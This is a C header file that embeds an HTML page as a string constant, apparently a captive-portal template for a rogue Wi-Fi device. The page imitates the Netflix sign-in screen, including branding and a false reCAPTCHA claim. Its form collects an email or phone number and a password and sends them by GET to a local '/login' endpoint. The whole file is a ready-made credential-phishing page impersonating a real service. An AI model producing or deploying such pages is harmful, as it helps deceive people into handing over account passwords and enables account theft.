#ifndef PORTAL_NETFLIX_H
#define PORTAL_NETFLIX_H

const char PORTAL_NETFLIX_HTML[] = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Netflix Sans', Helvetica, Arial, sans-serif;
            background: #000;
            min-height: 100vh;
            color: white;
        }
        .header {
            padding: 20px 40px;
        }
        .logo {
            color: #e50914;
            font-size: 32px;
            font-weight: bold;
        }
        .main {
            max-width: 450px;
            margin: 0 auto;
            padding: 60px 68px;
            background: rgba(0,0,0,0.75);
            border-radius: 4px;
            margin-top: 20px;
        }
        h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 28px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input {
            width: 100%;
            padding: 16px 20px;
            background: #333;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
        }
        input::placeholder {
            color: #8c8c8c;
        }
        input:focus {
            outline: none;
            background: #454545;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #e50914;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 24px;
        }
        button:hover {
            background: #f40612;
        }
        .options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 12px;
            font-size: 13px;
            color: #b3b3b3;
        }
        .remember {
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .remember input {
            width: auto;
            padding: 0;
        }
        a {
            color: #b3b3b3;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .signup {
            margin-top: 16px;
            color: #737373;
        }
        .signup a {
            color: white;
        }
        .recaptcha {
            margin-top: 16px;
            font-size: 13px;
            color: #8c8c8c;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">NETFLIX</div>
    </div>
    <div class="main">
        <h1>Sign In</h1>
        <form action="/login" method="GET">
            <div class="form-group">
                <input type="email" name="email" placeholder="Email or phone number" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Sign In</button>
            <div class="options">
                <label class="remember">
                    <input type="checkbox" checked> Remember me
                </label>
                <a href="#">Need help?</a>
            </div>
        </form>
        <p class="signup">New to Netflix? <a href="#">Sign up now</a>.</p>
        <p class="recaptcha">This page is protected by Google reCAPTCHA.</p>
    </div>
</body>
</html>
)rawliteral";

#endif
